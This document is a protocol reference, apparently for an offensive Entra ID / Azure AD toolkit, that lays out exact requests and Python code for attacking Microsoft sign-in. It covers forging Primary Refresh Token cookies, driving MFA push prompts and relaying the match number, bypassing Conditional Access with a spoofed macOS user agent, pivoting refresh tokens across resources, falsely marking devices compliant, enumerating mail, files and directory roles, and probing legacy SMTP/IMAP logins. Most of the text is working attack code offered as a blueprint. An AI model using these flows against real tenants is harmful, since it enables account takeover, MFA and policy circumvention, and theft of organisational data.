# Protocol Implementation Reference

Exact HTTP request/response sequences for each protocol flow. These are the working implementations distilled from 237 scripts. Use these as the blueprint; `GOAL.md` has the architecture.

---

## 1. Server Nonce (prerequisite for PRT operations)

Every PRT cookie needs a fresh server nonce.

```
POST https://login.microsoftonline.com/{tenant}/oauth2/token
Content-Type: application/x-www-form-urlencoded

grant_type=srv_challenge

Response: {"Nonce": "..."}
```

---

## 2. PRT Cookie Creation (KDF v2)

This is the core cryptographic operation. Used by PRT broker flow, CA exemption scanning, and DRS operations.

### Algorithm (pseudocode):

```python
import os, hashlib, base64
import jwt as pyjwt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.kbkdf import CounterLocation, KBKDFHMAC, Mode
from cryptography.hazmat.backends import default_backend

def calculate_derived_key(session_key_bytes, context_bytes):
    """KBKDFHMAC with SHA256. NOT manual hmac.new()."""
    kdf = KBKDFHMAC(
        algorithm=hashes.SHA256(),
        mode=Mode.CounterMode,
        length=32,
        rlen=4,
        llen=4,
        location=CounterLocation.BeforeFixed,
        label=b"AzureAD-SecureConversation",
        context=context_bytes,
        fixed=None,
        backend=default_backend()
    )
    return kdf.derive(session_key_bytes)

def create_prt_cookie(prt_token, session_key_bytes, nonce):
    # 1. Random 24-byte context
    context = os.urandom(24)

    # 2. JWT headers
    headers = {
        "ctx": base64.b64encode(context).decode("utf-8"),
        "kdf_ver": 2
    }

    # 3. JWT payload
    payload = {
        "refresh_token": prt_token,
        "is_primary": "true",
        "request_nonce": nonce
    }
    # If no nonce: use "iat": str(int(time.time())) instead

    # 4. Create temporary JWT with random key (just to get encoded body)
    temp_jwt = pyjwt.encode(payload, os.urandom(32), algorithm="HS256", headers=headers)

    # 5. Extract body bytes for key derivation
    jwt_body = base64url_decode(temp_jwt.split(".")[1])

    # 6. Derive signing key: SHA256(context + body) -> KBKDFHMAC
    d = hashlib.sha256()
    d.update(context)
    d.update(jwt_body)
    derived_key = calculate_derived_key(session_key_bytes, d.digest())

    # 7. Sign the real JWT
    return pyjwt.encode(payload, derived_key, algorithm="HS256", headers=headers)
```

### Input:
- `prt_token`: the `refresh_token` field from `roadtx.prt`
- `session_key_bytes`: `bytes.fromhex(prt_data["session_key"])`
- `nonce`: from srv_challenge above

### Output:
- A signed JWT string to use as `X-Ms-Refreshtokencredential` header

---

## 3. PRT Broker Authorization Flow

### Step 1: Authorize with PRT header

```
GET https://login.microsoftonline.com/{tenant}/oauth2/authorize
X-Ms-Refreshtokencredential: <prt_cookie>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView/3.0) ...Edge/18.19044

Query params:
  client_id=dd762716-544d-4aeb-a526-687b73838a22    (Auth Broker)
  response_type=code
  redirect_uri=ms-appx-web://Microsoft.AAD.BrokerPlugin/dd762716-544d-4aeb-a526-687b73838a22
  resource={target_resource}                          (DRS, Graph, etc.)
  scope=openid
  login_hint={username}
  response_mode=form_post
  windows_api_version=2.0
  amr_values=ngcmfa
  add_account=noheadsup

Allow redirects: true
```

### Response parsing:

Extract from HTML using regex `'"key"\s*:\s*"([^"]*)"'`:
- `stsErrorCode` -- error code (empty if success)
- `sFT` -- flow token (needed for MFA)
- `sCtx` -- context (needed for MFA)
- `canary` or `apiCanary` -- anti-CSRF token

Check for auth code: `name="code" value="([^"]+)"` -- if found, SSO succeeded without MFA.

If flow token exists but no code: MFA is required (go to step 2).

### Step 2: MFA Push (see section 4 below)

### Step 3: ProcessAuth (after MFA approval)

**Get a fresh PRT cookie** (new nonce) before this POST.

```
POST https://login.microsoftonline.com/common/SAS/ProcessAuth
Content-Type: application/x-www-form-urlencoded
X-Ms-Refreshtokencredential: <fresh_prt_cookie>

type=22
GeneralVerify=False
otherIdpType=other
ctx={ctx_from_endauth}
flowToken={flowtoken_from_endauth}
request={ctx_from_endauth}
mfaAuthMethod=PhoneAppNotification
```

**CRITICAL: Use `data={}` (form POST). NOT `json={}`. json causes AADSTS90014.**

### Step 3b: Handle intermediate pages

After ProcessAuth, loop up to 5 times checking for:

1. **appverify page** (stsErrorCode 399218, "appverify" in HTML):
   ```
   POST https://login.microsoftonline.com/appverify
   X-Ms-Refreshtokencredential: <fresh_prt_cookie>

   ctx={new_ctx}
   flowToken={new_ft}
   canary={new_canary}
   ```

2. **KMSI page** ("kmsi" in HTML, has flow token):
   ```
   POST https://login.microsoftonline.com/common/login

   LoginOptions=1
   ctx={new_ctx}
   flowToken={new_ft}
   canary={new_canary}
   ```

3. **Auth code in HTML**: `name="code" value="([^"]+)"` -- done.
4. **Auth code in redirect history**: check `resp.history[].headers["Location"]` for `code=`.

### Step 4: Token Exchange (JWE-encrypted)

```
POST https://login.microsoftonline.com/{tenant}/oauth2/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
client_id=dd762716-544d-4aeb-a526-687b73838a22
code={auth_code}
redirect_uri=ms-appx-web://Microsoft.AAD.BrokerPlugin/dd762716-544d-4aeb-a526-687b73838a22
resource={target_resource}
windows_api_version=2.2
client_info=1
```

**`windows_api_version=2.2` triggers JWE-encrypted response.** Use `2.0` for plaintext.

### Step 4b: Fallback -- jwt-bearer exchange

If standard exchange fails, try PRT-signed request:

```python
payload = {
    "grant_type": "authorization_code",
    "code": auth_code,
    "client_id": BROKER_CLIENT,
    "redirect_uri": BROKER_REDIRECT,
    "resource": target_resource,
    "scope": "openid",
    "iss": "aad:brokerplugin",
    "aud": "login.microsoftonline.com",
    "request_nonce": nonce,
    "iat": str(int(time.time())),
    "exp": str(int(time.time()) + 3600),
}
# Sign as PRT cookie (same KDF v2 algorithm)
# POST body: grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&request=<jwt>&windows_api_version=2.2&client_info=1
```

**CRITICAL: client_id, resource, redirect_uri go INSIDE the JWT payload. POST body only has grant_type, request, windows_api_version, client_info. Putting client_id in POST body causes AADSTS7000220.**

---

## 4. MFA Push (BeginAuth / EndAuth / ProcessAuth)

### BeginAuth

```
POST https://login.microsoftonline.com/common/SAS/BeginAuth
Content-Type: application/json

{
    "AuthMethodId": "PhoneAppNotification",
    "Method": "BeginAuth",
    "ctx": "{ctx_from_authorize}",
    "flowToken": "{ft_from_authorize}"
}
```

**Response (success):**
```json
{
    "Success": true,
    "ResultValue": "AuthenticationStarted",
    "Entropy": 42,          // <-- THE MFA MATCH NUMBER
    "SessionId": "...",
    "FlowToken": "...",
    "Ctx": "..."
}
```

**Write Entropy to stdout AND file IMMEDIATELY. Flush stdout.**

**Response (failure -- too many retries):**
```json
{
    "Success": false,
    "ResultValue": "UserAuthFailedDuplicateRequest",
    "Entropy": 0
}
```
Wait 30-60s, get fresh authorize page, retry.

### EndAuth (polling)

Poll every 5 seconds, up to 300 seconds (60 polls):

```
POST https://login.microsoftonline.com/common/SAS/EndAuth
Content-Type: application/json

{
    "AuthMethodId": "PhoneAppNotification",
    "Method": "EndAuth",
    "SessionId": "{from_beginauth}",
    "FlowToken": "{from_beginauth}",
    "Ctx": "{from_beginauth}",
    "PollCount": {1-based_counter}
}
```

**Success indicators** (accept ALL of these):
- `ResultValue == "Success"`
- `ResultValue == "PhoneAppNotificationApproved"`
- `ResultValue == "AuthenticationSucceeded"`

Always check `Success == true` AND ResultValue.

**Failure indicators** (stop polling):
- `ResultValue == "AuthenticationFailed"`
- `ResultValue == "Denied"`
- `ResultValue == "PhoneAppNotificationFailed"`
- `ResultValue == "UserAuthFailed"`

**Still waiting:** `ResultValue == "AuthenticationPending"`

### ProcessAuth (after approval)

See section 3, step 3 above.

### Two-Phase Split (SSH scenarios)

**Phase 1 (send_mfa.py):** Authorize + BeginAuth. Write state to `mfa_state.json`:
```json
{
    "phase": "mfa_sent",
    "entropy": 42,
    "ctx": "...",
    "flowToken": "...",
    "sessionId": "..."
}
```
Exit immediately after writing.

**Phase 2 (wait_mfa.py):** Read `mfa_state.json`, poll EndAuth, ProcessAuth, exchange token.

This split solves Python output buffering over SSH: phase 1 exits so the number is printed, phase 2 runs separately.

---

## 5. JWE Decryption

Broker token exchange with `windows_api_version=2.2` returns JWE (5 dot-separated parts):

```
header.encrypted_key.iv.ciphertext.auth_tag
```

### Algorithm:

```python
def decrypt_jwe(jwe_string, session_key_bytes):
    parts = jwe_string.split(".")
    assert len(parts) == 5

    header_b64, enc_key_b64, iv_b64, ciphertext_b64, tag_b64 = parts

    # 1. Parse header for context
    header = json.loads(base64url_decode(header_b64))
    ctx = base64.b64decode(header["ctx"])

    # 2. Derive decryption key
    derived_key = calculate_derived_key(session_key_bytes, ctx)
    # Same KBKDFHMAC function as PRT cookie

    # 3. Decode parts
    iv = base64url_decode(iv_b64)
    ciphertext = base64url_decode(ciphertext_b64)
    auth_tag = base64url_decode(tag_b64)

    # 4. Decrypt based on IV length
    if len(iv) == 12:
        # AES-256-GCM
        aesgcm = AESGCM(derived_key)
        plaintext = aesgcm.decrypt(
            iv,
            ciphertext + auth_tag,
            header_b64.encode("utf-8")  # AAD = base64url header
        )
    elif len(iv) == 16:
        # AES-256-CBC + PKCS7
        cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = PKCS7(128).unpadder()
        plaintext = unpadder.update(decrypted) + unpadder.finalize()

    return json.loads(plaintext)
```

---

## 6. ROPC (Resource Owner Password Credentials)

Simplest test. Used by recon module for CA fingerprinting.

### v1.0 endpoint:

```
POST https://login.microsoftonline.com/{tenant}/oauth2/token
Content-Type: application/x-www-form-urlencoded
User-Agent: {platform_specific_ua}

grant_type=password
client_id={client_id}
username={username}
password={password}
resource={v1_resource}
```

### v2.0 endpoint:

```
POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
Content-Type: application/x-www-form-urlencoded
User-Agent: {platform_specific_ua}

grant_type=password
client_id={client_id}
username={username}
password={password}
scope={v2_scope}
```

Response codes determine CA policy. See error code database in GOAL.md.

---

## 7. Selenium Platform CA Bypass

### Authorization URL construction (v2.0 with PKCE):

```python
import secrets, hashlib, base64

code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).decode().rstrip("=")

auth_url = (
    f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?"
    f"client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Office
    f"&response_type=code"
    f"&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient"
    f"&scope=User.Read+Mail.Read+Files.Read.All+offline_access"
    f"&code_challenge={code_challenge}"
    f"&code_challenge_method=S256"
    f"&login_hint={username}"
    f"&response_mode=query"
)
```

### Chromium options:

```python
from selenium.webdriver.chrome.options import Options

opts = Options()
opts.add_argument("--headless=new")
opts.add_argument("--no-sandbox")
opts.add_argument("--disable-dev-shm-usage")
opts.add_argument("--disable-gpu")
opts.add_argument(f"--user-agent={MACOS_SAFARI_UA}")
opts.binary_location = "/usr/bin/chromium"  # Linux/Kali
```

### DOM interaction sequence:

1. Navigate to auth_url
2. Wait for password field: `input[type='password']`
   - If not found, check for username field: `input[type='email'], input[name='loginfmt']`
   - Enter username, click `input[type='submit']`
   - Wait for password field
3. Enter password, click submit
4. Wait 5s, check URL for `code=`
5. If `50076` or `proofup` in page source: MFA page
   - Extract number from: `"displaySign": "NN"`, or `data-value="NN"`, or `.display-sign` class
   - Also try: `"Entropy": NN` in page source
   - Also try JS: `document.querySelector('[data-value]')?.getAttribute('data-value')`
6. Poll URL every 5s for `code=` in redirect
7. Check for KMSI page ("stay signed in"): click `#idBtn_Back` (No)
8. Extract code from URL: `url.split("code=")[1].split("&")[0]`

### Token exchange (v2.0 with PKCE):

```
POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
Content-Type: application/x-www-form-urlencoded
User-Agent: {macos_safari_ua}

grant_type=authorization_code
client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c
code={auth_code}
redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient
code_verifier={code_verifier}
```

### Refresh token pivot to all resources:

After getting initial token with `offline_access` scope:

```
POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
User-Agent: {macos_safari_ua}

grant_type=refresh_token
client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c
refresh_token={refresh_token}
scope={new_scope}
```

Where `new_scope` is each of: `https://graph.microsoft.com/.default`, `https://outlook.office365.com/.default`, etc.

---

## 8. CA Exemption Scan (Resource Sweep)

Uses PRT broker authorize flow against 40+ resources. For each resource, check if response contains 53003 (CA blocked) or 50076 (MFA only, no CA).

### Extended resource list to scan:

```python
resources = [
    # Core (known)
    ("urn:ms-drs:enterpriseregistration.windows.net", "DRS"),
    ("https://graph.microsoft.com", "MS Graph"),
    ("https://graph.windows.net", "AAD Graph"),
    ("https://outlook.office365.com", "Exchange"),
    ("https://management.azure.com", "Azure Mgmt"),
    ("https://api.manage.microsoft.com", "Intune"),
    ("https://substrate.office.com", "Substrate"),
    ("https://onenote.com", "OneNote"),

    # Azure infrastructure
    ("https://management.core.windows.net", "Azure Classic Mgmt"),
    ("https://database.windows.net", "Azure SQL"),
    ("https://vault.azure.net", "Key Vault"),
    ("https://storage.azure.com", "Azure Storage"),
    ("https://servicebus.azure.net", "Service Bus"),
    ("https://batch.core.windows.net", "Azure Batch"),
    ("https://datalake.azure.net", "Data Lake"),
    ("https://analysis.windows.net/powerbi/api", "Power BI"),
    ("https://dev.azuresynapse.net", "Synapse"),
    ("https://purview.azure.net", "Purview"),
    ("https://cognitiveservices.azure.com", "Cognitive Services"),
    ("https://digitaltwins.azure.net", "Digital Twins"),

    # M365
    ("https://manage.office.com", "Office Mgmt API"),
    ("https://protection.office.com", "Office Protection"),
    ("https://compliance.microsoft.com", "Compliance Center"),
    ("https://api.security.microsoft.com", "Security API"),
    ("https://api.spaces.skype.com", "Skype/Teams API"),
    ("https://lync.com", "Skype for Business"),
    ("https://api.yammer.com", "Yammer"),
    ("https://tasks.office.com", "Planner"),
    ("https://to-do.microsoft.com", "To-Do"),

    # Device management
    ("https://mam.manage.microsoft.com", "MAM"),
    ("https://intunemam.microsoftonline.com", "Intune MAM"),

    # Other
    ("499b84ac-1321-427f-aa17-267ca6975798", "Azure DevOps"),
    ("https://feeds.office.com", "Office Feeds"),
    ("https://webhook.azurewebsites.net", "Azure Webhooks"),

    # App IDs as resources
    ("00000002-0000-0000-c000-000000000000", "AAD Graph (app ID)"),
    ("00000003-0000-0000-c000-000000000000", "MS Graph (app ID)"),
    ("00000003-0000-0ff1-ce00-000000000000", "SharePoint (app ID)"),
    ("00000006-0000-0ff1-ce00-000000000000", "Exchange (app ID)"),
    ("fc780465-2017-40d4-a0c5-307022471b92", "WindowsDefenderATP"),
    ("cc15fd57-2c6c-4117-a88c-83b1d56b4bbe", "Teams Services"),
    ("48af08dc-f6d2-435f-b2a7-069abd99c086", "Intune Enrollment"),
]
```

---

## 9. DRS API Operations

### DRS PATCH (set device compliant):

```
PATCH https://enterpriseregistration.windows.net/EnrollmentServer/device/{device_id}?api-version=2.0
Authorization: Bearer {drs_token}
Content-Type: application/json

{"isCompliant": true, "isManaged": true}
```

**Returns HTTP 200 but compliance does NOT propagate to AAD device object.** See GOAL.md for why.

---

## 10. roadtx Commands

### Device registration:
```bash
roadtx device -a register
# Generates: device key, transport key, device certificate
# Outputs: .pem files and device registration response
```

### PRT request (using device cert):
```bash
roadtx prt -a request -c {device_cert.pfx} -u {username} -p {password}
# Outputs: roadtx.prt (JSON with refresh_token + session_key)
```

### PRT registration with existing cert:
```bash
roadtx prt -a register -c {cert.pfx} -u {username} -t {tenant}
# Full register + PRT in one step
```

### PRT renewal:
```bash
roadtx prt -a renew -f roadtx.prt
# Renews the PRT (they expire, check before use)
```

### PRT browser auth:
```bash
roadtx prtauth -c {client_id} -r {resource} -f roadtx.prt
# Opens browser with PRT cookie, gets token
```

### PRT structure (`roadtx.prt`):
```json
{
    "refresh_token": "0.ARo...(very long)...",
    "session_key": "bfa7185e...727670c",
    "x-ms-DeviceCredentialResult": "...",
    "is_primary": true
}
```

---

## 11. Token Refresh Across Resources

After obtaining any refresh token, exchange it for access to other resources:

### v1.0:
```
POST https://login.microsoftonline.com/{tenant}/oauth2/token

grant_type=refresh_token
client_id={same_client_id}
refresh_token={refresh_token}
resource={new_resource}
```

### v2.0:
```
POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token

grant_type=refresh_token
client_id={same_client_id}
refresh_token={refresh_token}
scope={new_scope}
```

**CA is re-evaluated on the target resource.** A refresh token from DRS cannot be exchanged for Graph if CA blocks Graph (error 53003). But if the refresh token was obtained via platform bypass (macOS UA), the CA evaluation uses the original platform context, so it may succeed.

---

## 12. Graph API Enumeration Endpoints

```python
graph_endpoints = [
    ("/v1.0/me", "Profile"),
    ("/v1.0/me/messages?$top=50&$select=subject,from,receivedDateTime", "Emails"),
    ("/v1.0/me/drive/root/children?$top=50", "OneDrive"),
    ("/v1.0/me/memberOf", "Group Memberships"),
    ("/v1.0/me/contacts?$top=50", "Contacts"),
    ("/v1.0/me/calendar/events?$top=20", "Calendar"),
    ("/v1.0/me/joinedTeams", "Teams"),
    ("/v1.0/me/chats?$top=10", "Chats"),
    ("/v1.0/organization", "Organization"),
    ("/v1.0/users?$top=999", "All Users"),
    ("/v1.0/groups?$top=999", "All Groups"),
    ("/v1.0/domains", "Domains"),
    ("/v1.0/applications?$top=100", "Applications"),
    ("/v1.0/servicePrincipals?$top=100", "Service Principals"),
    ("/v1.0/identity/conditionalAccess/policies", "CA Policies (admin only)"),
    ("/v1.0/directoryRoles", "Directory Roles"),
    ("/v1.0/roleManagement/directory/roleAssignments", "Role Assignments"),
    ("/v1.0/sites?search=*", "SharePoint Sites"),
    ("/v1.0/teams", "All Teams (admin)"),
]

# For each: GET https://graph.microsoft.com{endpoint}
# Authorization: Bearer {access_token}
```

---

## 13. Legacy Auth Probes

### SMTP AUTH (port 587):

```python
import smtplib
server = smtplib.SMTP("smtp.office365.com", 587)
server.starttls()
server.login(username, password)
# Success = legacy auth enabled = direct mailbox access
# AuthenticationError = legacy auth disabled (expected in modern tenants)
```

### IMAP (port 993):

```python
import imaplib
imap = imaplib.IMAP4_SSL("outlook.office365.com")
imap.login(username, password)
# Success = legacy auth enabled
# AUTHENTICATIONFAILED = disabled
```

---

## 14. Device Code Flow

```
POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode
Content-Type: application/x-www-form-urlencoded

client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46
scope=https://graph.microsoft.com/.default offline_access
```

Response: `{"device_code": "...", "user_code": "ABCD-EFGH", "verification_uri": "https://microsoft.com/devicelogin", "interval": 5}`

Poll:
```
POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token

grant_type=urn:ietf:params:oauth:grant-type:device_code
client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46
device_code={device_code}
```

Poll every `interval` seconds until success or expiry.

---

## 15. HTML Page Parsing Helpers

Azure AD login pages embed state as JavaScript variables. Extract with regex:

```python
import re

def extract_from_html(html, key):
    """Extract JS variable from Azure AD login page HTML."""
    m = re.search(rf'"{key}"\s*:\s*"([^"]*)"', html)
    return m.group(1) if m else None

# Common keys:
# stsErrorCode -- error code (e.g., "53003", "50076")
# sFT -- flow token
# sCtx -- context
# canary -- CSRF token
# apiCanary -- alternative CSRF token
# urlPost -- form post URL
# sFTTag -- flow token HTML tag
```

For auth code from form_post response:
```python
code_match = re.search(r'name="code"\s+value="([^"]+)"', html)
```

For errors in URL:
```python
if "error=" in url:
    error = url.split("error=")[1].split("&")[0]
    error_desc = url.split("error_description=")[1].split("&")[0]
```
